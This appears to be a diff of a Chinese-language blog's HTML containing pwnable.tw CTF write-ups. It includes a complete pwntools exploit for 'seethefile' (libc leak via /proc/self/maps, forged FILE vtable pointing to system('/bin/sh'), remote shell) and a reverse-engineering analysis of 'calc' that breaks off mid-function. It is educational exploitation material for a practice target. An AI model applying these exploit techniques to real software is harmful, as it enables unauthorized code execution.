-  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(content) </span><br><span class="line"></span><br><span class="line">rc()</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">rc()</span><br><span class="line">sl(<span class="string">'/proc/self/maps'</span>)</span><br><span class="line">rc()</span><br><span class="line">sl(<span class="string">'2'</span>)</span><br><span class="line">rc()</span><br><span class="line">sl(<span class="string">'2'</span>)</span><br><span class="line">rc()</span><br><span class="line">sl(<span class="string">'3'</span>)</span><br><span class="line">leak = ru(<span class="string">"r-xp"</span>)</span><br><span class="line">libc_base = int(<span class="string">"0x"</span>+leak[<span class="number">-22</span>:<span class="number">-14</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure>
+<pre><code class="python">  def sd(content):
+      p.send(content)
+
+  def sl(content):
+      p.sendline(content)
+
+  def rc():
+      return p.recv()
+
+  def ru(content):
+      return p.recvuntil(content) 
+
+  rc()
+  sl(&#39;1&#39;)
+  rc()
+  sl(&#39;/proc/self/maps&#39;)
+  rc()
+  sl(&#39;2&#39;)
+  rc()
+  sl(&#39;2&#39;)
+  rc()
+  sl(&#39;3&#39;)
+  leak = ru(&quot;r-xp&quot;)
+  libc_base = int(&quot;0x&quot;+leak[-22:-14],16)
+  print hex(libc_base)
+  system = libc_base + libc.symbols[&#39;system&#39;]
+
+</code></pre>
 </li>
 <li><p>伪造fake_file</p>
-  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">name_add = <span class="number">0x804B260</span></span><br><span class="line">fake_file = <span class="string">"/bin/sh\x00"</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x20</span>,<span class="string">'\x00'</span>) </span><br><span class="line">fake_file += p32(name_add)<span class="comment">#覆盖fp为name_add</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x48</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_file += p32(name_add + <span class="number">0x10</span>) <span class="comment"># 指向一处值为0的地址</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x94</span>, <span class="string">"\x00"</span>)</span><br><span class="line">fake_file += p32(<span class="number">0x804b2f8</span><span class="number">-0x44</span>)<span class="comment">#fake vtable address = name_add + 0x98 - 0x44</span></span><br><span class="line">fake_file += p32(system)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">  name_add = 0x804B260
+  fake_file = &quot;/bin/sh\x00&quot;
+  fake_file = fake_file.ljust(0x20,&#39;\x00&#39;) 
+  fake_file += p32(name_add)#覆盖fp为name_add
+  fake_file = fake_file.ljust(0x48,&#39;\x00&#39;)
+  fake_file += p32(name_add + 0x10) # 指向一处值为0的地址
+  fake_file = fake_file.ljust(0x94, &quot;\x00&quot;)
+  fake_file += p32(0x804b2f8-0x44)#fake vtable address = name_add + 0x98 - 0x44
+  fake_file += p32(system)
+</code></pre>
 <p>  但是这题getshell还不够，要拿到flag还要运行服务器上的一个程序….有点骚，他将cat flag 命令删掉了，不过程序源码也给出了，很容易看到逻辑，按照它的判断条件输入，它就会将flag打印出来</p>
 <p>  exp:</p>
-  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./seethefile'</span>)</span><br><span class="line">    elf = ELF(<span class="string">'./seethefile'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    host = <span class="string">'chall.pwnable.tw'</span></span><br><span class="line">    port = <span class="string">'10200'</span></span><br><span class="line">    p = remote(host,port)</span><br><span class="line">    elf = ELF(<span class="string">'./seethefile'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">context.arch = elf.arch</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(content) </span><br><span class="line"></span><br><span class="line">rc()</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">rc()</span><br><span class="line">sl(<span class="string">'/proc/self/maps'</span>)</span><br><span class="line">rc()</span><br><span class="line">sl(<span class="string">'2'</span>)</span><br><span class="line">rc()</span><br><span class="line">sl(<span class="string">'2'</span>)</span><br><span class="line">rc()</span><br><span class="line">sl(<span class="string">'3'</span>)</span><br><span class="line">leak = ru(<span class="string">"r-xp"</span>)</span><br><span class="line">libc_base = int(<span class="string">"0x"</span>+leak[<span class="number">-22</span>:<span class="number">-14</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">name_add = <span class="number">0x804B260</span></span><br><span class="line">fake_file = <span class="string">"/bin/sh\x00"</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x20</span>,<span class="string">'\x00'</span>) </span><br><span class="line">fake_file += p32(name_add)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x48</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_file += p32(name_add + <span class="number">0x10</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x94</span>, <span class="string">"\x00"</span>)</span><br><span class="line">fake_file += p32(<span class="number">0x804b2f8</span><span class="number">-0x44</span>)</span><br><span class="line">fake_file += p32(system)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">'5'</span>)</span><br><span class="line">rc()</span><br><span class="line">sl(fake_file)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">  #!/usr/bin/env python
+  from pwn import *
+  local = 0
+
+  if local:
+      p = process(&#39;./seethefile&#39;)
+      elf = ELF(&#39;./seethefile&#39;)
+      libc = elf.libc
+  else:
+      host = &#39;chall.pwnable.tw&#39;
+      port = &#39;10200&#39;
+      p = remote(host,port)
+      elf = ELF(&#39;./seethefile&#39;)
+      libc = ELF(&#39;./libc_32.so.6&#39;)
+
+  context.arch = elf.arch
+  context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+  context.log_level=&#39;debug&#39;
+
+  def sd(content):
+      p.send(content)
+
+  def sl(content):
+      p.sendline(content)
+
+  def rc():
+      return p.recv()
+
+  def ru(content):
+      return p.recvuntil(content) 
+
+  rc()
+  sl(&#39;1&#39;)
+  rc()
+  sl(&#39;/proc/self/maps&#39;)
+  rc()
+  sl(&#39;2&#39;)
+  rc()
+  sl(&#39;2&#39;)
+  rc()
+  sl(&#39;3&#39;)
+  leak = ru(&quot;r-xp&quot;)
+  libc_base = int(&quot;0x&quot;+leak[-22:-14],16)
+  print hex(libc_base)
+  system = libc_base + libc.symbols[&#39;system&#39;]
+
+  name_add = 0x804B260
+  fake_file = &quot;/bin/sh\x00&quot;
+  fake_file = fake_file.ljust(0x20,&#39;\x00&#39;) 
+  fake_file += p32(name_add)
+  fake_file = fake_file.ljust(0x48,&#39;\x00&#39;)
+  fake_file += p32(name_add + 0x10)
+  fake_file = fake_file.ljust(0x94, &quot;\x00&quot;)
+  fake_file += p32(0x804b2f8-0x44)
+  fake_file += p32(system)
+
+  sl(&#39;5&#39;)
+  rc()
+  sl(fake_file)
+  p.interactive()
+</code></pre>
 </li>
 </ul>
 <h3 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h3><p>防护机制：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">☁  calc  checksec calc</span><br><span class="line">[*] &apos;/home/zs0zrc/pwn/pwnable.tw/calc/calc&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-<p>对它进行简单的逆向，发现它有很多库函数，说面这是静态编译的。用file查看下文件信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">☁  calc  file calc</span><br><span class="line">calc: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=26cd6e85abb708b115d4526bcce2ea6db8a80c64, not stripped</span><br></pre></td></tr></table></figure>
-<p>它的主函数很简单，很短，主要功能是进行 +、-、 *、 \、%的基本运算。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ssignal(<span class="number">14</span>, timeout);</span><br><span class="line">  alarm(<span class="number">60</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"=== Welcome to SECPROG calculator ==="</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  calc();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Merry Christmas!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>☁  calc  checksec calc
+[*] &#39;/home/zs0zrc/pwn/pwnable.tw/calc/calc&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre><p>对它进行简单的逆向，发现它有很多库函数，说面这是静态编译的。用file查看下文件信息</p>
+<pre><code>☁  calc  file calc
+calc: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=26cd6e85abb708b115d4526bcce2ea6db8a80c64, not stripped
+</code></pre><p>它的主函数很简单，很短，主要功能是进行 +、-、 *、 \、%的基本运算。</p>
+<pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  ssignal(14, timeout);
+  alarm(60);
+  puts(&quot;=== Welcome to SECPROG calculator ===&quot;);
+  fflush(stdout);
+  calc();
+  return puts(&quot;Merry Christmas!&quot;);
+}
+</code></pre>
 <p>主要功能集中在calc函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">calc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  pool pool; <span class="comment">// [esp+18h] [ebp-5A0h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1ACh] [ebp-40Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+5ACh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    bzero(&amp;s, <span class="number">0x400</span>u);                          <span class="comment">// 初始化存储表达式的数组</span></span><br><span class="line">    <span class="keyword">if</span> ( !get_expr(&amp;s, <span class="number">1024</span>) )					<span class="comment">//读取计算表达式</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    init_pool(&amp;pool);							<span class="comment">//初始化pool，这个pool结构体我定义了一下</span></span><br><span class="line">    <span class="keyword">if</span> ( parse_expr(&amp;s, &amp;pool) )				<span class="comment">//解析表达式，并计算出结果</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, pool.data[pool.idx - <span class="number">1</span>]);	<span class="comment">//将计算计过打印出来，计算结果存储在pool.data[pool.idx - 1]中</span></span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">unsigned int calc()
+{
+  pool pool; // [esp+18h] [ebp-5A0h]
+  char s; // [esp+1ACh] [ebp-40Ch]
+  unsigned int v3; // [esp+5ACh] [ebp-Ch]
+
+  v3 = __readgsdword(0x14u);
+  while ( 1 )
+  {
+    bzero(&amp;s, 0x400u);                          // 初始化存储表达式的数组
+    if ( !get_expr(&amp;s, 1024) )                    //读取计算表达式
+      break;
+    init_pool(&amp;pool);                            //初始化pool，这个pool结构体我定义了一下
+    if ( parse_expr(&amp;s, &amp;pool) )                //解析表达式，并计算出结果
+    {
+      printf(&quot;%d\n&quot;, pool.data[pool.idx - 1]);    //将计算计过打印出来，计算结果存储在pool.data[pool.idx - 1]中
+      fflush(stdout);
+    }
+  }
+  return __readgsdword(0x14u) ^ v3;
+}
+</code></pre>
 <p>init_pool函数，对pool进行初始化</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pool *__<span class="function">cdecl <span class="title">init_pool</span><span class="params">(pool *pool)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  pool *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = pool;</span><br><span class="line">  pool-&gt;idx = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = pool;</span><br><span class="line">    pool-&gt;data[i] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">pool *__cdecl init_pool(pool *pool)
+{
+  pool *result; // eax
+  signed int i; // [esp+Ch] [ebp-4h]
+
+  result = pool;
+  pool-&gt;idx = 0;
+  for ( i = 0; i &lt;= 99; ++i )
+  {
+    result = pool;
+    pool-&gt;data[i] = 0;
+  }
+  return result;
+}
+</code></pre>
 <p>parse_expr函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">parse_expr</span><span class="params">(<span class="keyword">int</span> buf, pool *pool)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n; <span class="comment">// ST2C_4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> src; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  src = buf;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  bzero(s, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (*(i + buf) - <span class="string">'0'</span>) &gt; <span class="number">9</span> )	<span class="comment">//当buf[i]为 运算符时，将前面的数字存到pool中</span></span><br><span class="line">    &#123;</span><br><span class="line">      n = i + buf - src;                       </span><br><span class="line">      dest = <span class="built_in">malloc</span>(n + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, src, n);</span><br><span class="line">      dest[n] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(dest, <span class="string">"0"</span>) )	<span class="comment">//数字的第一位不可以为0</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"prevent division by zero"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = atoi(dest);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = pool-&gt;idx++;</span><br><span class="line">        pool-&gt;data[v4] = v9;                    <span class="comment">//将数字存储到pool</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(i + buf) &amp;&amp; (*(i + <span class="number">1</span> + buf) - <span class="string">'0'</span>) &gt; <span class="number">9</span> )<span class="comment">//两个运算符不能相邻</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"expression error!"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      src = i + <span class="number">1</span> + buf;</span><br><span class="line">      <span class="keyword">if</span> ( s[v7] )		<span class="comment">//s数组是用来存储运算符的</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( *(i + buf) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'%'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'*'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'/'</span>:</span><br><span class="line">            <span class="keyword">if</span> ( s[v7] != <span class="string">'+'</span> &amp;&amp; s[v7] != <span class="string">'-'</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              eval(pool, s[v7]);</span><br><span class="line">              s[v7] = *(i + buf);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              s[++v7] = *(i + buf);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'+'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'-'</span>:</span><br><span class="line">            eval(pool, s[v7]);</span><br><span class="line">            s[v7] = *(i + buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            eval(pool, s[v7--]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[v7] = *(i + buf);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !*(i + buf) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v7 &gt;= <span class="number">0</span> )</span><br><span class="line">    eval(pool, s[v7--]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">signed int __cdecl parse_expr(int buf, pool *pool)
+{
+  int n; // ST2C_4
+  int v4; // eax
+  int src; // [esp+20h] [ebp-88h]
+  int i; // [esp+24h] [ebp-84h]
+  int v7; // [esp+28h] [ebp-80h]
+  char *dest; // [esp+30h] [ebp-78h]
+  int v9; // [esp+34h] [ebp-74h]
+  char s[100]; // [esp+38h] [ebp-70h]
+  unsigned int v11; // [esp+9Ch] [ebp-Ch]
+
+  v11 = __readgsdword(0x14u);
+  src = buf;
+  v7 = 0;
+  bzero(s, 0x64u);
+  for ( i = 0; ; ++i )
+  {
+    if ( (*(i + buf) - &#39;0&#39;) &gt; 9 )    //当buf[i]为 运算符时，将前面的数字存到pool中
+    {
+      n = i + buf - src;                       
+      dest = malloc(n + 1);
+      memcpy(dest, src, n);
+      dest[n] = 0;
+      if ( !strcmp(dest, &quot;0&quot;) )    //数字的第一位不可以为0
+      {
+        puts(&quot;prevent division by zero&quot;);
+        fflush(stdout);
+        return 0;
+      }
+      v9 = atoi(dest);
+      if ( v9 &gt; 0 )
+      {
+        v4 = pool-&gt;idx++;
+        pool-&gt;data[v4] = v9;                    //将数字存储到pool
+      }
+      if ( *(i + buf) &amp;&amp; (*(i + 1 + buf) - &#39;0&#39;) &gt; 9 )//两个运算符不能相邻
+      {
+        puts(&quot;expression error!&quot;);
+        fflush(stdout);
+        return 0;
+      }
+      src = i + 1 + buf;
+      if ( s[v7] )        //s数组是用来存储运算符的
+      {
+        switch ( *(i + buf) )
+        {
+          case &#39;%&#39;:
+          case &#39;*&#39;:
+          case &#39;/&#39;:
+            if ( s[v7] != &#39;+&#39; &amp;&amp; s[v7] != &#39;-&#39; )
+            {
+              eval(pool, s[v7]);
+              s[v7] = *(i + buf);
+            }
+            else
+            {
+              s[++v7] = *(i + buf);
+            }
+            break;
+          case &#39;+&#39;:
+          case &#39;-&#39;:
+            eval(pool, s[v7]);
+            s[v7] = *(i + buf);
+            break;
+          default:
+            eval(pool, s[v7--]);
+            break;
+        }
+      }
+      else
+      {
+        s[v7] = *(i + buf);
+      }
+      if ( !*(i + buf) )
+        break;
+    }
+  }
+  while ( v7 &gt;= 0 )
+    eval(pool, s[v7--]);
+  return 1;
+}
+</code></pre>
 <p>漏洞在eval函数中，这里存在一个逻辑漏洞，可以通过构造形如 +300+1的payload 修改 pool.idx, 进而实现任意地址写</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pool *__<span class="function">cdecl <span class="title">eval</span><span class="params">(pool *pool, <span class="keyword">char</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  pool *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == 